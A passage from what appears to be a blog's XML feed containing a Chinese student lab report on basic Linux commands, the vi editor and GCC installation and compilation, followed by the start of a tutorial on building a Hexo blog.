class="headerlink" title="Linux系统管理命令"></a>Linux系统管理命令</h3><ol><li><p>write 用户账号 [终端名称]</p><p>​    用于传讯息给其他使用者。使用权限：所有使用者。</p><ul><li>参数说明：<ul><li>用户账号：预备传讯息的使用者帐号；</li><li>终端名称：如果使用者同时有两个以上的 tty 连线，可以自行选择合适的 tty 传讯息；</li></ul></li></ul></li><li><p>mesg [y/n]</p><p>​    用于设置终端机的写入权限；</p><ul><li>参数如下：<ul><li>n，不允许其他用户将信息直接显示在你的屏幕上；</li><li>y，允许其他用户将信息直接显示在你的屏幕上；</li></ul></li></ul></li><li><p>free  [-b | -k | -m]</p><p>​        用于显示内存状态。free指令会显示内存的使用情况，包括实体内存，虚拟的交换文件内存，共享内存区段，以及系统核心使用的缓冲区等。</p><ul><li>参数如下：<ul><li>-b，以Byte为单位显示内存使用情况。</li><li>-k，以KB为单位显示内存使用情况。</li><li>-m，以MB为单位显示内存使用情况。</li></ul></li><li>实例如下：<ul><li>free -k           //以kb显示内存<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image222.jpg" alt="img"></li></ul></li></ul></li></ol><h3 id="Linux磁盘管理命令"><a href="#Linux磁盘管理命令" class="headerlink" title="Linux磁盘管理命令"></a>Linux磁盘管理命令</h3><ol><li><p>df  [选项] [文件]</p><p>​    命令用于显示目前在Linux系统上的文件系统的磁盘使用情况统计；</p><ul><li>选项包括：<ul><li>-a，包含所有的具有 0 Blocks 的文件系统；</li><li>–block-size={SIZE}，使用{SIZE}大小的Blocks；</li><li>-h，使用人类可读的格式(预设值是不加这个选项的…)；</li><li>-H，很像 -h, 但是用 1000 为单位而不是用 1024；</li><li>-i，列出 inode 资讯，不列出已使用 block；</li><li>-k，就像是 –block-size=1024；</li><li>-l，限制列出的文件结构；</li><li>-m，就像 –block-size=1048576；</li><li>-P，使用 POSIX 输出格式；</li><li>-t，限制列出文件系统的TYPE；</li><li>-T，显示文件系统的形式；</li><li>-x，限制列出文件系统不要显示 TYPE；</li></ul></li><li>实例如下：<ul><li>df -aT     //显示目录下包含所有的具有 0 Blocks 的文件系统，及其系统形式；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image224.jpg" alt="img"></li><li>df -t ext4              //只显示ext4类型的文件系统；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image226.jpg" alt="img"></li></ul></li></ul></li><li><p>du [选项] [目录名或文件名] </p><p>​    用于显示目录或文件的大小；</p><ul><li>选项包括：<ul><li>-a，显示目录中个别文件的大小；</li><li>-b，显示目录或文件大小时，以byte为单位；</li><li>-c，除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和；</li><li>-D，显示指定符号连接的源文件大小；</li><li>-h，以K，M，G为单位，提高信息的可读性；</li><li>-H，与-h参数相同，但是K，M，G是以1000为换算单位；</li><li>-k，以1024 bytes为单位；</li><li>-l，重复计算硬件连接的文件</li><li>-L&lt;符号连接&gt;，显示选项中所指定符号连接的源文件大小；</li><li>-m，以1MB为单位；</li><li>-s，仅显示总计；</li><li>-S，显示个别目录的大小时，并不含其子目录的大小；</li><li>-x，以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过</li><li>-X&lt;文件&gt;，在&lt;文件&gt;指定目录或文件；</li></ul></li><li>实例如下：<ul><li>du –a /          //显示目录下所有文件大小；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image228.jpg" alt="img"></li><li>du -s leeyuxun            //显示属于leeyuxun的文件总数；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image230.jpg" alt="img"></li></ul></li></ul></li><li><p>dd [选项]</p><p>​    用于读取、转换并输出数据；</p><ul><li>选项如下：<ul><li>if=文件名，输入文件名，默认为标准输入。即指定源文件。</li><li>of=文件名，输出文件名，默认为标准输出。即指定目的文件。</li><li>ibs=bytes，一次读入bytes个字节，即指定一个块大小为bytes个字节。</li><li>obs=bytes，一次输出bytes个字节，即指定一个块大小为bytes个字节。</li><li>bs=bytes，同时设置读入/输出的块大小为bytes个字节。</li><li>cbs=bytes，一次转换bytes个字节，即指定转换缓冲区大小。</li><li>skip=blocks，从输入文件开头跳过blocks个块后再开始复制。</li><li>seek=blocks，从输出文件开头跳过blocks个块后再开始复制。</li><li>count=blocks，仅拷贝blocks个块，块大小等于ibs指定的字节数。</li></ul></li><li>实例如下：<ul><li>dd if=/dev/fd of=/dev/fd1 bs=5120         //将dev下的fd复制到fd1中，设置输入块大小为5120字节；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image232.jpg" alt="img"></li></ul></li></ul></li><li><p>fdformat [−n] 设备名</p><p>​    用于对指定的软碟机装置进行低阶格式化；</p><p>​    -n，关闭确认功能。这个选项会关闭格式化之后的确认步骤；</p></li></ol><h3 id="Linux进程管理命令"><a href="#Linux进程管理命令" class="headerlink" title="Linux进程管理命令"></a>Linux进程管理命令</h3><ol><li><p>at [选项] 时间 </p><p>​    设置在指定时间执行指定的命令；</p><ul><li>选项包括：<ul><li>-l，显示等待执行的调度作业；</li><li>-d，删除指定的调度作业；</li><li>-v，显示作业执行的时间；</li><li>-m，作业结束后发送邮件给执行的at命令的用户；</li></ul></li></ul></li><li><p>bg，fg</p><p>​    前后台切换；</p><ul><li>前台作业切换到后台运行：bg [作业号]；</li><li>后台作业切换到前台运行：fg [作业号]；</li><li>显示当前所有作业：jobs [选项]；</li></ul></li><li><p>ps [选项]</p><p>​    显示系统中当前的进程及其状态;</p><ul><li>选项包括：<ul><li>-a，显示当前终端上所有用户的进程；</li><li>-e，显示所有进程的信息；</li><li>-f，显示完整格式的输出；</li><li>-l，显示进程的详细信息，包括父进程号、登录的终端号、进程优先级等；</li><li>-u，显示指定用户的所有进程；</li><li>-C &lt;命令&gt;，列出指定命令的状况；</li><li>-x，显示后台进程的信息；</li><li>-t &lt;终端号&gt;，显示指定终端上的进程信息；</li></ul></li><li>实例如下：<ul><li>ps          //列出所有进程<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image234.jpg" alt="img"></li></ul></li></ul></li><li><p>pstree [选项]</p><p>​    树形图形显示进程之间的相互关系;</p><ul><li>选项包括<ul><li>-a，显示启动进程的命令行；</li><li>-n，按照进程号进行排序；</li><li>-p，显示进程号；</li></ul></li><li>实例如下：<ul><li>pstree -p              //列出进程树，并显示进程号；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image236.jpg" alt="img"></li></ul></li></ul></li><li><p>kill命令</p><p><strong>kill [-s &lt;**</strong>信息名称或编号&gt;] [程序]或kill [-l &lt;信息编号&gt;]**</p><ul><li>参数说明：<ul><li>-l &lt;信息编号&gt;，若不加&lt;信息编号&gt;选项，则-l参数会列出全部的信息名称；</li><li>-s &lt;信息名称或编号&gt;，指定要送出的信息；</li><li>[程序]，可以是程序的PID或是PGID，也可以是工作编号；</li></ul></li></ul></li></ol><h3 id="Linux其他命令"><a href="#Linux其他命令" class="headerlink" title="Linux其他命令"></a>Linux其他命令</h3><ol><li><p>echo [-n] 字符串 </p><p>​    输出字符串；</p><ul><li>-n，不在末尾换行；</li><li>示例显示：<ul><li>echo Hello world!        //打印字符串“Hello world!”<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image238.jpg" alt="img"></li></ul></li></ul></li><li><p>cal [选项] [月份] [年]</p><p>​    用于查看日历信息；</p><ul><li>实例如下：<ul><li>cal 9 2019            //打印2019年9月日历；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image240.jpg" alt="img"></li></ul></li></ul></li><li><p>date [选项] +显示时间格式</p><p>​    用来显示或设定系统的日期与时间;</p><ul><li>选项包括：<ul><li>-d&lt;字符串&gt;：显示字符串所指的日期与时间。字符串前后必须加上双引号； </li><li>-s&lt;字符串&gt;：根据字符串来设置日期与时间。字符串前后必须加上双引号； </li><li>-u：显示GMT；</li></ul></li><li>实例如下：<ul><li>date 08211550            //显示8月21日15:50;<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image242.jpg" alt="img"></li></ul></li></ul></li><li><p>clear</p><p>​    用于清除屏幕;</p></li></ol><h2 id="Vi的熟悉与使用"><a href="#Vi的熟悉与使用" class="headerlink" title="Vi的熟悉与使用"></a>Vi的熟悉与使用</h2><p>vi共分为三种模式：分别是<strong>命令模式（Command mode）</strong>，<strong>插入模式（Insert mode）</strong>和<strong>末行模式（Last line mode）</strong></p><h3 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h3><p>用户刚刚启动vi，即可进入命令模式。</p><p>此状态下敲击键盘动作会被vi识别为命令，而非输入字符。比如我们此时按下i，并不会输入一个字符，i被当作了一个命令。</p><p>以下是常用的几个命令：</p><ul><li>i，切换到插入模式，以输入字符;</li><li>x，删除当前光标所在处的字符;</li><li>:，切换到末行模式，以在最底一行输入命令</li></ul><p>若想要编辑文本：启动vi，进入了命令模式，按下i，切换到插入模式；</p><p>命令模式只有一些最基本的命令，因此仍要依靠末行模式输入更多命令；</p><h3 id="插入模式"><a href="#插入模式" class="headerlink" title="插入模式"></a>插入模式</h3><p>在命令模式下按下i就进入了插入模式。</p><p>在插入模式中，可以使用以下按键：</p><ul><li><strong>字符按键以及Shift组合</strong>，输入字符；</li><li><strong>ENTER</strong>，回车键，换行；<strong>BACK SPACE</strong>，退格键，删除光标前一个字符；</li><li><strong>DEL</strong>，删除键，删除光标后一个字符；<strong>方向键</strong>，在文本中移动光标；</li><li><strong>HOME</strong>/<strong>END</strong>，移动光标到行首/行尾；</li><li><strong>Page Up</strong>/<strong>Page Down</strong>，上/下翻页；</li><li><strong>Insert</strong>，切换光标为输入/替换模式，光标将变成竖线/下划线；</li><li><strong>ESC</strong>，退出插入模式，切换到命令模式；</li></ul><h3 id="末行模式"><a href="#末行模式" class="headerlink" title="末行模式"></a>末行模式</h3><p>在命令模式下按下:（英文冒号）进入末行模式。</p><p>末行模式可以输入单个或多个字符的命令，可用的命令非常多。</p><p>在末行模式中，基本的命令有（已经省略了冒号）：</p><ul><li><p>q，退出程序；</p></li><li><p>w，保存文件</p></li></ul><p>按ESC键可随时退出末行模式；</p><h3 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h3><ol><li>使用命令vi mine.txt，新建txt文件，并打开进入命令模式；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image244.jpg" alt="img"><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image246.jpg" alt="img"></li><li>按下i，进入插入模式，开始编辑文字；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image248.jpg" alt="img"></li><li>按下esc，回到命令模式，在命令模式中按下:wq，保存并离开，如果只输入:q，是直接离开，不保存；<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image250.jpg" alt="img"></li></ol><h3 id="命令说明"><a href="#命令说明" class="headerlink" title="命令说明"></a>命令说明</h3><ol><li><p>命令模式可用的光标移动、复制粘贴、搜索替换等按钮</p><ol><li><p>移动光标的方法</p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>h 或 向左箭头键(←)</td><td>光标向左移动一个字符</td></tr><tr><td>j 或 向下箭头键(↓)</td><td>光标向下移动一个字符</td></tr><tr><td>k 或 向上箭头键(↑)</td><td>光标向上移动一个字符</td></tr><tr><td>l 或 向右箭头键(→)</td><td>光标向右移动一个字符</td></tr><tr><td>如向下移动 30 行，可以使用 “30j” 或 “30↓” 的组合按键</td><td></td></tr><tr><td>[Ctrl] + [f]</td><td>屏幕『向下』移动一页，相当于   [Page Down]按键 (常用)</td></tr><tr><td>[Ctrl] + [b]</td><td>屏幕『向上』移动一页，相当于 [Page Up] 按键 (常用)</td></tr><tr><td>[Ctrl] + [d]</td><td>屏幕『向下』移动半页</td></tr><tr><td>[Ctrl] + [u]</td><td>屏幕『向上』移动半页</td></tr><tr><td>+</td><td>光标移动到非空格符的下一行</td></tr><tr><td>-</td><td>光标移动到非空格符的上一行</td></tr><tr><td>n<space></td><td>n 表示『数字』，按下数字后再按空格键，光标会向右移动这一行的 n 个字符。例如 20<space> 则光标会向后面移动 20 个字符距离。</td></tr><tr><td>0 或功能键[Home]</td><td>移动到这一行的最前面字符处   (常用)</td></tr><tr><td>$ 或功能键[End]</td><td>移动到这一行的最后面字符处(常用)</td></tr><tr><td>H</td><td>光标移动到这个屏幕的最上方那一行的第一个字符</td></tr><tr><td>M</td><td>光标移动到这个屏幕的中央那一行的第一个字符</td></tr><tr><td>L</td><td>光标移动到这个屏幕的最下方那一行的第一个字符</td></tr><tr><td>G</td><td>移动到这个档案的最后一行(常用)</td></tr><tr><td>nG</td><td>移动到这个档案的第 n 行。例如 20G 则会移动到这个档案的第 20 行(可配合 :set nu)</td></tr><tr><td>gg</td><td>移动到这个档案的第一行，相当于 1G</td></tr><tr><td>N<Enter></td><td>光标向下移动 n 行(常用)</td></tr></tbody></table></li><li><p>复制、粘贴、删除</p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>X，x</td><td>在一行字当中，x 为向后删除一个字符 (相当于 [del] 按键)， X 为向前删除一个字符(相当于   [backspace] 亦即是退格键) (常用)</td></tr><tr><td>nx</td><td>连续向后删除 n 个字符</td></tr><tr><td>dd</td><td>删除游标所在的那一整行(常用)</td></tr><tr><td>ndd</td><td>删除光标所在的向下 n 行</td></tr><tr><td>d1G</td><td>删除光标所在到第一行的所有数据</td></tr><tr><td>dG</td><td>删除光标所在到最后一行的所有数据</td></tr><tr><td>d$</td><td>删除游标所在处，到该行的最后一个字符</td></tr><tr><td>d0</td><td>那个是数字的 0 ，删除游标所在处，到该行的最前面一个字符</td></tr><tr><td>yy</td><td>复制游标所在的那一行(常用)</td></tr><tr><td>nyy</td><td>复制光标所在的向下 n 行</td></tr><tr><td>y1G</td><td>复制游标所在行到第一行的所有数据</td></tr><tr><td>yG</td><td>复制游标所在行到最后一行的所有数据</td></tr><tr><td>y0</td><td>复制光标所在的那个字符到该行行首的所有数据</td></tr><tr><td>Y$</td><td>复制光标所在的那个字符到该行行尾的所有数据</td></tr><tr><td>P，p</td><td>p 为将已复制的数据在光标下一行贴上，P 则为贴在游标上一行</td></tr><tr><td>J</td><td>将光标所在行与下一行的数据结合成同一行</td></tr><tr><td>c</td><td>重复删除多个数据，例如向下删除 10 行，[ 10cj ]</td></tr><tr><td>u</td><td>复原前一个动作</td></tr><tr><td>[Ctrl]+r</td><td>重做上一个动作</td></tr><tr><td>.</td><td>重复前一个动作</td></tr></tbody></table></li><li><p>搜索、替换</p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>/word</td><td>向光标之下寻找一个名称为   word 的字符串</td></tr><tr><td>?word</td><td>向光标之上寻找一个字符串名称为 word 的字符串</td></tr><tr><td>n</td><td>重复前一个搜寻的动作</td></tr><tr><td>N</td><td>『反向』进行前一个搜寻动作</td></tr><tr><td>:n1,n2s/word1/word2/g</td><td>在第 n1 与 n2 行之间寻找 word1 这个字符串，并将该字符串取代为 word2</td></tr><tr><td>:1,$s/word1/word2/g 或 :%s/word1/word2/g</td><td>从第一行到最后一行寻找   word1 字符串，并将该字符串取代为 word2</td></tr><tr><td>:1,$s/word1/word2/gc 或 :%s/word1/word2/gc</td><td>从第一行到最后一行寻找   word1 字符串，并将该字符串取代为 word2 ，且在取代前显示提示字符给用户确认 (confirm) 是否需要取代</td></tr></tbody></table></li><li><p>命令模式切换到插入模式的可用的按钮</p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>I，i</td><td>进入插入模式(Insert   mode)：    i 为『从目前光标所在处输入』；    I 为『在目前所在行的第一个非空格符处开始输入』</td></tr><tr><td>A，a</td><td>进入插入模式(Insert   mode)：    a 为『从目前光标所在的下一个字符处开始输入』；     A 为『从光标所在行的最后一个字符处开始输入』</td></tr><tr><td>O，o</td><td>进入插入模式(Insert   mode)：    o 为『在目前光标所在的下一行处输入新的一行』；    O 为在目前光标所在处的上一行输入新的一行</td></tr><tr><td>R，r</td><td>进入取代模式(Replace mode)：   r 只会取代光标所在的那一个字符一次；    R会一直取代光标所在的文字，直到按下 ESC 为止；</td></tr><tr><td>vi 画面的左下角处会出现『–INSERT–』或『–REPLACE–』的字样，一定要在左下角处看到 INSERT 或 REPLACE 才能输入字符</td><td></td></tr><tr><td>[Esc]</td><td>退出编辑模式，回到命令模式中</td></tr></tbody></table></li><li><p>末行模式切换到指令行模式的可用的按钮</p></li></ol></li></ol><pre><code>| 命令                | 说明                                                         || ------------------- | ------------------------------------------------------------ || :w                  | 保存文件                                                     || :w!                 | 若文件属性为『只读』时，强制写入保存文件                     || :q                  | 退出vi                                                       || :q!                 | 强制退出                                                     || :wq                 | 保存并退出                                                   || ZZ                  | 文件没有更动，则不储存离开，若文件已经被更动过，则储存后离开 || :w [filename]       | 编辑的数据另存为filename                                     || :r [filename]       | 编辑的数据中，读入另一个filename                             || :n1,n2 w [filename] | 将 n1 到 n2 的内容储存成 filename                            || :! Command          | 暂时离开 vi 到指令行模式下执行 command 的显示结果            || :set nu             | 显示行号，设定之后，会在每一行的前缀显示该行的行号           || :set nonu           | 取消行号                                                     |</code></pre><h2 id="安装Linux的编译器GCC"><a href="#安装Linux的编译器GCC" class="headerlink" title="安装Linux的编译器GCC"></a>安装<code>Linux</code>的编译器<code>GCC</code></h2><ol><li><p>打开<code>Linux</code>终端，输入命令如下，发现已经安装<code>gcc</code>；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc –version</span><br></pre></td></tr></table></figure><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image252.jpg" alt="img"></p></li><li><p>在终端输入命令如下，卸载<code>gcc</code>；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum remove gcc --skip -broken</span><br></pre></td></tr></table></figure><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image254.jpg" alt="img"></p></li><li><p>下载安装<code>gcc</code>、<code>g++</code>的必要<code>rpm</code>包</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">binutils-2.20.51.0.2-5.36.el6.x86_64.rpm</span></span><br><span class="line"><span class="string">cloog-ppl-0.15.7-1.2.el6.x86_64.rpm</span></span><br><span class="line"><span class="string">cpp-4.4.7-3.el6.x86_64.rpm</span></span><br><span class="line"><span class="string">gcc-4.4.7-3.el6.x86_64.rpm</span></span><br><span class="line"><span class="string">gcc-c++-4.4.7-3.el6.x86_64.rpm</span></span><br><span class="line"><span class="string">glibc-devel-2.12-1.107.el6.x86_64.rpm</span></span><br><span class="line"><span class="string">glibc-headers-2.12-1.107.el6.x86_64.rpm</span></span><br><span class="line"><span class="string">kernel-headers-2.6.32-358.el6.x86_64.rpm</span></span><br><span class="line"><span class="string">libstdc++-devel-4.4.7-3.el6.x86_64.rpm</span></span><br><span class="line"><span class="string">mpfr-2.4.1-6.el6.x86_64.rpm</span></span><br><span class="line"><span class="string">ppl-0.10.2-11.el6.x86_64.rpm</span></span><br></pre></td></tr></table></figure><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image256.jpg" alt="img"></p></li><li><p>在终端输入命令如下，安装上述安装包；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -ivh (rpm包名称)</span><br></pre></td></tr></table></figure><p><img src="C:%5CUsers%5CLevi%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1569573078991.png" alt="1569573078991"></p></li><li><p>在终端输入如下命令，查看<code>gcc</code>版本为<code>4.4.7</code>，安装成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc --version</span><br><span class="line">g++ --version</span><br></pre></td></tr></table></figure><p> <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image260.jpg" alt="img"></p></li></ol><h2 id="熟悉使用GCC编译环境"><a href="#熟悉使用GCC编译环境" class="headerlink" title="熟悉使用GCC编译环境"></a>熟悉使用GCC编译环境</h2><ol><li><p><code>gcc</code>编译的四个步骤</p><ol><li><p>预处理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o mine.i mine.c -E</span><br><span class="line">*.c --&gt; *.i</span><br></pre></td></tr></table></figure><p>主要是把头文件展开，完成函数或结构体等的声明;</p></li><li><p>编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o mine.s mine.i -S</span><br><span class="line">*.i --&gt; *.s</span><br></pre></td></tr></table></figure><p>主要是把c源码文件翻译成汇编文件;</p></li><li><p>汇编</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o mine.o mine.s -c</span><br><span class="line">*.s --&gt; *.o</span><br></pre></td></tr></table></figure><p>主要是把汇编文件翻译成二进制的目标文件;</p></li><li><p>链接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*.o --&gt; *.bin</span><br></pre></td></tr></table></figure><p>把所有的目标文件添加上和系统对接的代码，最后生成可执行程序;</p></li></ol><p>编译总过程为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o ****.i  ****.c -E</span><br><span class="line">gcc -o ****.s  ****.i -S</span><br><span class="line">gcc -o ****.o  ****.s -c</span><br><span class="line">gcc -o ****.bin  ****.o</span><br></pre></td></tr></table></figure></li><li><p>新建<code>mine.c</code>文件，编写代码如下</p></li></ol><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image262.jpg" alt="img"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image264.jpg" alt="img"></p><h1 id="实验关键里程碑数据与结果"><a href="#实验关键里程碑数据与结果" class="headerlink" title="实验关键里程碑数据与结果"></a>实验关键里程碑数据与结果</h1><ol><li>安装<code>red hat linux</code>分区和选取服务</li></ol><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image265.jpg" alt="img"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image266.jpg" alt="img"></p><ol start="2"><li><p>熟悉<code>Linux</code>文件目录的用途</p><p><img src="C:%5CUsers%5CLevi%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1569484636627.png" alt="1569484636627"></p></li><li><p>熟悉常用命令，<code>mount</code>较难理解</p></li></ol><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image268.jpg" alt="img"></p><ol start="4"><li><p><code>GCC</code>使用，了解编译过程如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o mine.i  mine.c -E</span><br><span class="line">gcc -o mine.s  mine.i -S</span><br><span class="line">gcc -o mine.o  mine.s -c</span><br><span class="line">gcc -o mine.bin  mine.o</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/clip_image262.jpg" alt="img"></p><h1 id="实验难点与收获"><a href="#实验难点与收获" class="headerlink" title="实验难点与收获"></a>实验难点与收获</h1><h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><ol><li>安装磁盘时，分区与挂载过程中操作复杂，理解困难；</li><li><code>usr</code>目录和根目录名称相同的目录代表的意义不相同；</li><li><code>gcc</code>安装与配置需要的<code>rpm</code>包比较多，容易漏装；</li></ol><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ol><li>之前<code>VMware</code>安装虚拟机，一直使用简易安装，这次学会了使用自定义安装虚拟机；</li><li>熟悉了<code>linux</code>基本命令，基本学会使用命令行，思维从图形化界面到命令行有了一定的转换；</li><li>对<code>Linux</code>目录结构有了一定的了解，与<code>windows</code>目录结构有一定的区别；</li><li>基本学会使用<code>vi</code>编辑器；</li><li>了解了<code>linux</code>中<code>GCC</code>编译执行<code>c</code>语言文件的过程；</li></ol><h1 id="实验思考"><a href="#实验思考" class="headerlink" title="实验思考"></a>实验思考</h1><p>该实验主要目的是熟悉<code>linux</code>虚拟机安装、目录结构、基本命令、<code>GCC</code>使用。实验内容相对基础，但是比较繁琐，尤其是熟悉基本命令，觉得可以适当精简；实验整体思路符合逻辑。</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统内核实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo搭建博客并部署到github上</title>
      <link href="/Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E5%B9%B6%E9%83%A8%E7%BD%B2%E5%88%B0github%E4%B8%8A.html"/>
      <url>/Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E5%B9%B6%E9%83%A8%E7%BD%B2%E5%88%B0github%E4%B8%8A.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        最近<code>hexo</code>框架的个人博客比较潮流，自己也搭建了一个，简单总结了一下过程，适合像我这样的小白上手体验。<a id="more"></a></p><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><ul><li><p>安装 <a href="https://git-scm.com/" target="_blank" rel="noopener">git</a></p></li><li><p>安装 <a href="https://nodejs.org/zh-cn/" target="_blank" rel="noopener">node.js</a></p><p>备注：官方网站下载安装包，直接安装即可。</p></li></ul><h1 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装<code>Hexo</code></h1><p>使用<code>npm</code>安装<code>hexo</code>即可，命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><h1 id="新建项目"><a href="#新建项目" class="headerlink" title="新建项目"></a>新建项目</h1><h2 id="初始化项目"><a href="#初始化项目" class="headerlink" title="初始化项目"></a>初始化项目</h2><ol><li><p>打开命令行，在命令行输入如下命令，初始化项目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init &lt;folder&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;floder&gt;</code>是本地的文件目录，例如我用的是<code>D:\hexo\Leeyuxun</code>，如果不输入<code>&lt;folder&gt;</code>，会默认在当前目录初始化目录。</p></li><li><p>进入<code>&lt;folder&gt;</code>目录，安装依赖包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &lt;floder&gt;</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>在<code>&lt;folder&gt;</code>目录生成文件包括：</p><ul><li><code>scaffolds</code> : 脚手架，用于存放创建文章时的模版;</li><li><code>source</code> ：用于存放博客原文件、其他静态资源文件；</li><li><code>themes</code> : 用于存放主题，默认主题为<code>landscape</code>；</li><li><code>_config.yml</code> : <code>Hexo</code>和站点的配置文件，可设置博客的名字、标题、作者、链接格式等相关内容；</li></ul></li><li><p>启动本地服务</p><p>在<code>&lt;floder&gt;</code>目录下执行如下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>即可在浏览器输入<code>localhost:4000</code>访问，第一次初始化的时候hexo已经写了一篇名为 Hello World 的文章</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1569402084705.png" alt="1569402084705"></p></li></ol><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>修改博客根目录下的<code>_config.yml</code>文件，对<code>hexo</code>进行相关配置。</p><ol><li><p>站点配置</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Hexo</span><span class="comment">#网站标题</span></span><br><span class="line"><span class="attr">subtitle:</span><span class="comment">#网站子标题</span></span><br><span class="line"><span class="attr">description:</span><span class="comment">#网站描述</span></span><br><span class="line"><span class="attr">keywords:</span><span class="comment">#网站搜索关键字</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">John</span> <span 